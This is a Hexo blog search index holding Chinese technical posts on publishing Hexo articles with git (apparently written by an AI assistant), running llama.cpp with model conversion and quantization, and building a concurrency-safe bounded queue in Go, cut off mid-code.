<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OpenClaw AI：我的第一篇博客！🚀🎉</title>
      <link href="/post/openclaw-ai-my-first-blog.html"/>
      <url>/post/openclaw-ai-my-first-blog.html</url>
      
        <content type="html"><![CDATA[<h3 id="如何撰写并发布Hexo博客文章"><a href="#如何撰写并发布Hexo博客文章" class="headerlink" title="如何撰写并发布Hexo博客文章"></a>如何撰写并发布Hexo博客文章</h3><p><strong>引言</strong></p><p>Hexo是一个快速、简单、功能强大的博客框架，基于Node.js开发，以其生成静态页面的高效性而广受欢迎。它让创作者能够专注于内容本身，而将网站搭建和部署的复杂性降至最低。本文将详细指导您如何在一个已有的Hexo项目中，从撰写到发布的完整流程，确保您的精彩内容能够顺利与读者见面。</p><p><strong>前置条件：已克隆的Hexo项目</strong></p><p>假设您已经将包含Hexo博客的Git仓库（例如 <code>tianyk/note</code>）克隆到了本地的工作目录，路径为 <code>coding/note</code>。所有的操作都将在这个项目的根目录下进行。</p><p><strong>第一步：创建新文章</strong></p><p>Hexo通过命令行工具简化了文章的创建过程。您只需一个命令，即可生成带有预设结构的Markdown文件。</p><ol><li><strong>进入项目目录</strong>：<br>首先，确保您在Hexo项目的根目录下：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> coding/note</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>hexo new</code> 命令</strong>：<br>执行以下命令来创建一篇新文章，将 <code>&quot;您的文章标题&quot;</code> 替换为您博客文章的实际标题。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;您的文章标题&quot;</span></span><br></pre></td></tr></table></figure>此命令会在 <code>coding/note/source/_posts/</code> 目录下创建一个新的Markdown文件（例如 <code>您的文章标题.md</code>），并根据 <code>scaffolds/post.md</code> 模板自动填充一些基本内容。</li></ol><p><strong>第二步：编辑文章内容</strong></p><p>新创建的Markdown文件是您撰写文章的核心。它由两部分组成：YAML Front Matter（元数据）和文章正文。</p><ol><li><p><strong>打开文章文件</strong>：<br>您需要使用文本编辑器打开 <code>coding/note/source/_posts/您的文章标题.md</code>。</p></li><li><p><strong>YAML Front Matter</strong>：<br>文件顶部由三横线 <code>---</code> 包裹的部分是文章的元数据，称为YAML Front Matter。您需要根据文章内容修改这些信息。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">您的文章标题</span> <span class="comment"># 文章的显示标题</span></span><br><span class="line"><span class="attr">date:</span> <span class="string">YYYY-MM-DD</span> <span class="string">HH:MM:SS</span> <span class="comment"># 文章发布日期和时间，建议精确到秒</span></span><br><span class="line"><span class="attr">tags:</span> <span class="comment"># 文章标签，可以有零个、一个或多个</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">教程</span></span><br><span class="line"><span class="attr">categories:</span> <span class="comment"># 文章分类，可以有零个、一个或多个</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">技术分享</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>请注意，<code>tags</code> 和 <code>categories</code> 可以方便读者进行分类检索。</p></li><li><p><strong>文章正文</strong>：</p><p>在YAML Front Matter之后，您可以使用标准的Markdown语法撰写文章内容。包括标题、段落、列表、代码块、图片链接等。</p></li></ol><p><strong>第三步：本地预览文章</strong></p><p>在正式发布之前，强烈建议您在本地预览文章，确保其布局、格式和内容符合预期，避免不必要的修改和重复部署。</p><ol><li><p><strong>启动本地服务器</strong>：<br>在 <code>coding/note</code> 项目根目录下，运行以下命令启动Hexo的本地服务器。如果您希望预览草稿文章，请使用 <code>npm run dev</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br><span class="line"><span class="comment"># 或者直接使用 hexo s --draft (会显示草稿，即使未指定为 post 类型)</span></span><br><span class="line"><span class="comment"># 或者 hexo s (只预览已发布状态的文章)</span></span><br></pre></td></tr></table></figure><p>服务器通常会在 <code>http://localhost:4000</code> 端口运行。</p></li><li><p><strong>浏览器检查</strong>：<br>在您的Web浏览器中访问 <code>http://localhost:4000</code>，并导航到您新创建的文章页面，仔细检查显示效果。</p></li></ol><p><strong>第四步：编译、提交并推送至Git仓库</strong></p><p>当您对文章内容和排版满意，并在本地预览确认无误后，即可准备发布。由于您的部署流程涉及独立服务器拉取并编译，这里的“发布”指的是将所有更新（包括生成的网站文件）推送到您的Git仓库。</p><ol><li><p><strong>编译网站文件</strong>：<br>在提交任何新内容或修改后，您需要首先在 <code>coding/note</code> 项目根目录下运行编译命令。这将根据您的Markdown文件生成静态的HTML、CSS、JavaScript等网站资源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br><span class="line"><span class="comment"># 或者直接使用 hexo g</span></span><br></pre></td></tr></table></figure><p>此命令会在 <code>coding/note/public/</code> 目录下创建或更新所有需要部署的网站文件。</p></li><li><p><strong>提交更改</strong>：<br>确保已生成的网站文件（位于 <code>public/</code> 目录）以及您的源文件（新文章、图片或其他资源）都被Git追踪。然后，将这些更改添加到Git的暂存区，并进行提交。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> coding/note</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;feat: 发布新博客文章 - [您的文章标题]&quot;</span></span><br></pre></td></tr></table></figure><p>请将提交信息中的 <code>[您的文章标题]</code> 替换为实际的文章标题。</p></li><li><p><strong>推送更改</strong>：<br>最后，将本地的提交推送到远程Git仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br><span class="line"><span class="comment"># 如果您的主分支是 main，则使用 git push origin main</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="进阶优化与常见问题：让发布之旅更顺畅"><a href="#进阶优化与常见问题：让发布之旅更顺畅" class="headerlink" title="进阶优化与常见问题：让发布之旅更顺畅"></a>进阶优化与常见问题：让发布之旅更顺畅</h3><p>在Hexo博客的撰写和发布过程中，我们可能会遇到一些初始化或环境配置上的小挑战。以下是一些常见问题及其解决方案，希望能帮助您的发布之旅更加顺畅：</p><h4 id="1-Hexo命令未识别的问题"><a href="#1-Hexo命令未识别的问题" class="headerlink" title="1. Hexo命令未识别的问题"></a>1. Hexo命令未识别的问题</h4><p>初次使用Hexo时，如果直接输入 <code>hexo new</code> 等命令发现系统提示“command not found”，这通常是因为Hexo工具没有被正确地加入到您的系统路径中。<br><strong>解决方案</strong>：建议使用 <code>npx hexo new</code> 命令。<code>npx</code> 是一个强大的工具，它允许您执行npm包中的命令，无论这些包是全局安装的还是项目本地安装的，确保您能够顺利地使用Hexo的各项功能。</p><h4 id="2-依赖安装速度缓慢的问题"><a href="#2-依赖安装速度缓慢的问题" class="headerlink" title="2. 依赖安装速度缓慢的问题"></a>2. 依赖安装速度缓慢的问题</h4><p>在项目初始化阶段运行 <code>npm install</code> 来安装项目依赖时，可能会遇到安装速度非常慢，甚至卡顿的情况。这通常与网络环境、npm注册表响应速度或<code>node_modules</code>的缓存机制有关。<br><strong>解决方案</strong>：</p><ul><li><strong>优化镜像源</strong>：确保您的项目或全局npm配置指向一个快速的镜像源（例如，在项目根目录的 <code>.npmrc</code> 文件中配置 <code>registry = https://registry.npmmirror.com</code>）。</li><li><strong>切换包管理器</strong>：如果项目存在 <code>pnpm-lock.yaml</code> 文件（表明项目可能期望使用 <code>pnpm</code>），强烈建议切换到 <code>pnpm install</code>。<code>pnpm</code> 以其独特的包管理方式，通常能提供更快的安装速度和更高效的磁盘空间利用。</li></ul><h4 id="3-Git提交时身份信息缺失"><a href="#3-Git提交时身份信息缺失" class="headerlink" title="3. Git提交时身份信息缺失"></a>3. Git提交时身份信息缺失</h4><p>在尝试 <code>git commit</code> 时，如果遇到“Author identity unknown”的错误提示，这意味着Git客户端尚未知道是谁在进行这次提交。</p><p><strong>解决方案</strong>：您需要在Git配置中设置提交者的用户名称和邮箱。您可以使用以下命令为当前项目配置（推荐）或全局配置：<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git config user.email <span class="string">&quot;ai@example.com&quot;</span></span><br><span class="line">git config user.name <span class="string">&quot;OpenClaw AI&quot;</span></span><br></pre></td></tr></table></figure><br>    请根据实际情况替换邮箱和名称。</p><h4 id="4-Git推送时的凭证验证问题"><a href="#4-Git推送时的凭证验证问题" class="headerlink" title="4. Git推送时的凭证验证问题"></a>4. Git推送时的凭证验证问题</h4><p>当您运行 <code>git push</code> 命令时，如果 Git 提示需要用户名和密码进行身份验证，这通常发生在您使用HTTPS方式克隆仓库，并且凭证未被缓存的情况下。AI通常无法直接输入这些凭证。</p><p><strong>解决方案</strong>：</p><ul><li><p><strong>切换到SSH协议</strong>：将Git远程仓库的URL从HTTPS格式（<code>https://github.com/user/repo.git</code>）修改为SSH格式（<code>git@github.com:user/repo.git</code>）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git remote set-url origin git@github.com:user/repo.git</span><br></pre></td></tr></table></figure><p>这允许Git使用您系统上已配置的SSH密钥进行免密验证。</p></li><li><p><strong>配置SSH密钥</strong>：确保您的宿主机器已生成并配置了SSH密钥，并将公钥添加到了您的Git服务提供商（如GitHub）的账户设置中。</p></li></ul><h4 id="5-SSH主机真实性验证提示"><a href="#5-SSH主机真实性验证提示" class="headerlink" title="5. SSH主机真实性验证提示"></a>5. SSH主机真实性验证提示</h4><p>当您首次通过SSH协议连接到一个新的Git宿主时，可能会收到一个安全提示，询问“Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])?”，要求您验证主机的真实性。</p><p><strong>解决方案</strong>：这是一个必要的安全步骤。您需要在宿主机器的终端中，手动对该提示输入 <code>yes</code> 并回车。这将把该Git宿主的公钥指纹添加到您系统上的 <code>~/.ssh/known_hosts</code> 文件中，确保后续的SSH连接能够直接被信任。</p><p>预集成这些经验，希望能让您未来的Hexo博客管理和发布工作更加便捷高效。</p><p><strong>结语</strong></p><p>通过以上步骤，您可以高效地在Hexo博客中撰写、预览并发布新的文章。专注于高质量的内容创作，而技术细节将由Hexo和您的自动化部署流程轻松处理。祝您写作愉快！</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenClaw AI </tag>
            
            <tag> Hexo </tag>
            
            <tag> 博客实践 </tag>
            
            <tag> 部署指南 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用llama.cpp推理大模型</title>
      <link href="/post/use-llama-cpp.html"/>
      <url>/post/use-llama-cpp.html</url>
      
        <content type="html"><![CDATA[<h2 id="llama-cpp"><a href="#llama-cpp" class="headerlink" title="llama.cpp"></a>llama.cpp</h2><p>大模型有训练和推理两部分，训练会产生一个大模型文件，这些文件通常包含了模型架构以及每个神经元的权重和偏置值。<a href="https://github.com/ggerganov/llama.cpp">llama.cpp</a>主要用在推理部分，它是一个是一个使用<code>c++</code>开发的大模型推理框架。它可以在普通家用电脑上完成推理，只需要CPU和几个G的内存就能运行。</p><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><blockquote><p>参考 <a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#build">https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#build</a></p></blockquote><ol><li><p>拉取代码</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ggerganov/llama.cpp.git</span><br></pre></td></tr></table></figure></li><li><p>编译</p><blockquote><p>对于非<code>Apple Silicon</code>系列芯片推理时如果有问题可以在编译时禁用<code>GPU</code>。编译时使用<code>LLAMA_NO_METAL=1</code>或者<code>LLAMA_METAL=OFF</code>参数。<a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#metal-build">https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#metal-build</a></p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></li></ol><p>编译完成会参数<code>mian</code>和<code>quantize</code>文件，前者用来运行大模型推理，后者用来模型向量化处理。</p><h3 id="模型转换"><a href="#模型转换" class="headerlink" title="模型转换"></a>模型转换</h3><p>一般大模型文件都托管在<a href="https://huggingface.co/">Hugging Face</a>上面。一般情况下<code>llama.cpp</code>不能直接使用这些大模型进行推理，我们需要先对这些模型进行转换，转为<code>ggml</code>格式。支持转换的大模型列表参考官方<a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#description">README</a>国产大模型百川、千问等都支持转为<code>ggml</code>格式。</p><p>转换使用<code>llama.cpp</code>项目内的<code>convert.py</code>或者<code>convert-hf-to-gguf.py</code>处理，详细步骤参考 <a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#prepare-data--run">https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#prepare-data--run</a>。这里对Python版本有一定的要求，模块的依赖在<code>requirements.txt</code>和<code>requirements</code>目录下。</p><p>一般情况先使用<code>convert.py</code>转换，如果转换失败在使用<code>convert-hf-to-gguf.py</code>尝试处理。注意，使用<code>convert-hf-to-gguf.py</code>时需要我们安装额外的依赖，依赖列表在<code>requirements/requirements-convert-hf-to-gguf.txt</code>。</p><p>转换后的模型我们需要进行向量化，使用<code>./quantize</code>对转换后的模型进行向量化。向量化后的模型就可以进行推理了。</p><h3 id="和llama-cpp类似的工具"><a href="#和llama-cpp类似的工具" class="headerlink" title="和llama.cpp类似的工具"></a>和llama.cpp类似的工具</h3><ul><li><p><a href="https://github.com/li-plus/chatglm.cpp">chatglm.cpp</a></p><p>  一个用于<a href="https://github.com/THUDM/ChatGLM3">ChatGLM</a>大模型推理框架</p></li><li><p><a href="https://github.com/SJTU-IPADS/PowerInfer">PowerInfer</a></p><ul><li>一个可以在消费级GPU运行的大模型推理框架</li></ul></li></ul><h3 id="Hugging-Face-镜像"><a href="#Hugging-Face-镜像" class="headerlink" title="Hugging Face 镜像"></a>Hugging Face 镜像</h3><ul><li><p><a href="https://www.modelscope.cn/models">modelscope</a></p><p>  可以直接使用<code>git clone</code>拉取大模型。注意，需要安装<a href="https://git-lfs.com/">LFS</a></p></li><li><p><a href="https://hf-mirror.com/">hf-mirror</a></p><p>  配置镜像后可以使用<code>huggingface</code>官方命令行<code>huggingface-cli</code>工具下载模型文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HF_ENDPOINT=https://hf-mirror.com</span><br></pre></td></tr></table></figure></li></ul><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><ul><li><p>B<br>  大模型权重参数单位，1B表示十亿。例如有<code>7B</code>、<code>14B</code>表示参数有70亿和140亿，参数越大推理时耗费的资源越多</p></li><li><p>FP16、int8、int4</p><p>  FP16、int8、int4 等通常指的是模型权重、激活值或梯度的数值表示方式，表示数值精度。</p><p>  FP16 指的是 16 位浮点数（即半精度浮点数），每个数值占用 2 字节。</p><p>  int8 指的是 8 位整数，每个数值占用 1 字节。</p><p>  1B的FP16精度的大模型为<code>1000,000,000</code> * 2Byte ≈ 2GB，1B的int8精度的大模型为<code>1000,000,000</code> * 1Byte ≈ 1GB</p></li><li><p>Quantization (量化)</p><p>  <code>量化</code> 是一种通过降低数值表示精度（如将 FP32 降为 int8）的技术，以减少内存和计算资源的消耗。</p><p>  量化后的模型可以在内存占用和计算复杂度方面更高效，尤其是在推理阶段显著提高速度。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Golang的并发安全</title>
      <link href="/post/go-sync.html"/>
      <url>/post/go-sync.html</url>
      
        <content type="html"><![CDATA[<h2 id="Golang的并发安全"><a href="#Golang的并发安全" class="headerlink" title="Golang的并发安全"></a>Golang的并发安全</h2><p>在有多个<code>goroutines</code>同时访问并且至少有一个<code>goroutines</code>在修改数据的情况下就会存在并发问题。Golang处理并发安全有锁和<code>channel</code>两种方案，前者通过加锁方式保证同一时刻只有一个操作在访问数据，后者是将操作串行化来来实现同一时刻只能有一个操作访问数据。这两种方法都是在通过约束并发访问&#x2F;修改数据来解决并发安全问题。</p><p>在<code>Golang</code>官网有一段关于并发安全的建议：</p><blockquote><p><a href="https://golang.org/ref/mem#tmp_1">Advice</a></p><p>Programs that modify data being simultaneously accessed by multiple goroutines must serialize such access.<br>To serialize access, protect the data with channel operations or other synchronization primitives such as those in the sync and sync&#x2F;atomic packages.<br>If you must read the rest of this document to understand the behavior of your program, you are being too clever.<br>Don’t be clever.</p></blockquote><p>下面我将从实现一个并发安全的队列来介绍<code>Golang</code>里面的并发工具。</p><h3 id="并发安全的队列"><a href="#并发安全的队列" class="headerlink" title="并发安全的队列"></a>并发安全的队列</h3><p>一个简单的队列最少有<code>Add</code>和<code>Pop</code>两个操作，队列内部一般通过列表或者链表来存放数据。这两个操作都是对底层的列表或者链表的写操作。底层的列表和链表并不是并发安全的，在多个<code>goroutines</code>在同时<code>Add</code>或<code>Pop</code>时就会有并发问题。</p><p>要实现一个并发安全的队列，就要在<code>Add</code>和<code>Pop</code>操作加锁：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">    elements []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    lock *sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Pop() (ele <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">    q.lock.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.lock.Unlock()</span><br><span class="line"></span><br><span class="line">    ele = q.elements[q.Size()<span class="number">-1</span>]</span><br><span class="line">    q.elements = q.elements[:q.Size()<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Add(ele <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">    q.lock.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.lock.Unlock()</span><br><span class="line"></span><br><span class="line">    q.elements = <span class="built_in">append</span>(q.elements, ele)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考虑到现实的情况，我们队列的容量不能是没有限制的，这会有内存方面的问题，我们要限制队列的容量。队列空的时候<code>Pop</code>时我们要阻塞直到有值，队列满时我们<code>Add</code>要阻塞到队列不满，这种情况就需要<code>sync.Cond</code>来阻塞。它和Java中的<code>内置条件队列</code>类似，可以使当前<code>goroutine</code>在某个状态上一直等待，直到这个状态被激活。</p><table><thead><tr><th>Java</th><th>Golang</th></tr></thead><tbody><tr><td>wait</td><td>Wait</td></tr><tr><td>notify</td><td>Signal</td></tr><tr><td>notifyAll</td><td>Broadcast</td></tr></tbody></table><p>我们需要两个<code>sync.Cond</code>条件来分别表示队列为空和队列满两种状态，这两个<code>sync.Cond</code>内部要使用同一把锁用在操作<code>Add</code>和<code>Pop</code>来避免并发问题。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">    elements []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    capacity <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 队列未空条件队列</span></span><br><span class="line">    notEmptyCond *sync.Cond</span><br><span class="line">    <span class="comment">// 队列未满条件队列</span></span><br><span class="line">    notFullCond *sync.Cond</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Size() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(q.elements)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isFull() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> q.Size() &gt;= q.capacity</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isEmpty() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> q.Size() == <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Pop() (ele <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.notEmptyCond.L.Unlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isEmpty() &#123;</span><br><span class="line">        <span class="comment">// 如果队列是空的，就在 `notEmptyCond` 条件上等待 </span></span><br><span class="line">        <span class="comment">// Wait 内部会先释放锁，等到收到满足信号时将重新尝试获得锁</span></span><br><span class="line">        q.notEmptyCond.Wait()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele = q.elements[q.Size()<span class="number">-1</span>]</span><br><span class="line">    q.elements = q.elements[:q.Size()<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">// 此时队列中已经 Pop 一个值，不再满。发送`notFullCond`信号激活再此条件 `Wait` 的操作</span></span><br><span class="line">    q.notFullCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Add(ele <span class="keyword">interface</span>&#123;&#125;) (err <span class="type">error</span>) &#123;</span><br><span class="line">    q.notEmptyCond.L.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.notEmptyCond.L.Unlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q.isFull() &#123;</span><br><span class="line">       q.notFullCond.Wait()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q.elements = <span class="built_in">append</span>(q.elements, ele)</span><br><span class="line">    <span class="comment">// 此时队列中已经有值，发送队列不为空的信号激活再此条件 `Wait` 的操作</span></span><br><span class="line">    q.notEmptyCond.Signal()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewQueue</span><span class="params">(capacity <span class="type">int</span>)</span></span> *Queue &#123;</span><br><span class="line">    <span class="comment">// 使用同一把锁</span></span><br><span class="line">    <span class="keyword">var</span> lock sync.Mutex</span><br><span class="line">    notEmptyCond := sync.NewCond(&amp;lock)</span><br><span class="line">    notFullCond := sync.NewCond(&amp;lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;Queue&#123;</span><br><span class="line">        elements: <span class="built_in">make</span>([]<span class="keyword">interface</span>&#123;&#125;, <span class="number">0</span>, capacity),</span><br><span class="line">        capacity: capacity,</span><br><span class="line"></span><br><span class="line">        notEmptyCond: notEmptyCond,</span><br><span class="line">        notFullCond:  notFullCond,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Cond.Wait()</code>在没有收到条件满足信号时会一直阻塞，有时会出现父<code>goroutine</code>异常退出时子<code>goroutine</code>还在等待的情况。比如下面的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestQueue_Add</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    queue := NewQueue(<span class="number">10</span>)</span><br><span class="line">     <span class="comment">// 系统当前`goroutine`数量</span></span><br><span class="line">    expectedNumGoroutine := runtime.NumGoroutine()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起一个协程 `Pop`，由于队列此时为空。`Pop` 操作永远不会返回</span></span><br><span class="line">    <span class="comment">// chanel要有缓冲区，如果父`goroutine`提前退出，chanel无接收者时。done &lt;- ele 会阻塞，此`goroutine`将不能退出，造成 goroutine leak。</span></span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// 如果父`goroutine`此时已经退出，这时`Pop`出来的消息将丢失</span></span><br><span class="line">        ele, _ := queue.Pop()</span><br><span class="line">        done &lt;- ele</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(<span class="number">100</span> * time.Millisecond):</span><br><span class="line">        <span class="comment">// parent goroutine exit</span></span><br><span class="line">        <span class="comment">// 由于Pop操作此时还没返回，实际协程数量+1</span></span><br><span class="line">        assert.Equal(t, expectedNumGoroutine+<span class="number">1</span>, runtime.NumGoroutine())</span><br><span class="line">    <span class="keyword">case</span> &lt;-done:</span><br><span class="line">        assert.Equal(t, expectedNumGoroutine, runtime.NumGoroutine())</span><br><span class="line">    &#125;</span><br><span class="line">    queue.Add(<span class="number">1</span>)</span><br><span class="line">    time.Sleep(time.Millisecond)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这条消息可能会在父`goroutine`退出后才返回</span></span><br><span class="line">    assert.Equal(t, <span class="number">1</span>, &lt;-done)</span><br><span class="line">    assert.Equal(t, <span class="number">0</span>, queue.Size())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要解决上面问题，我们就需要使用来<code>Context</code>来取消子<code>goroutine</code>。下面是完整的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 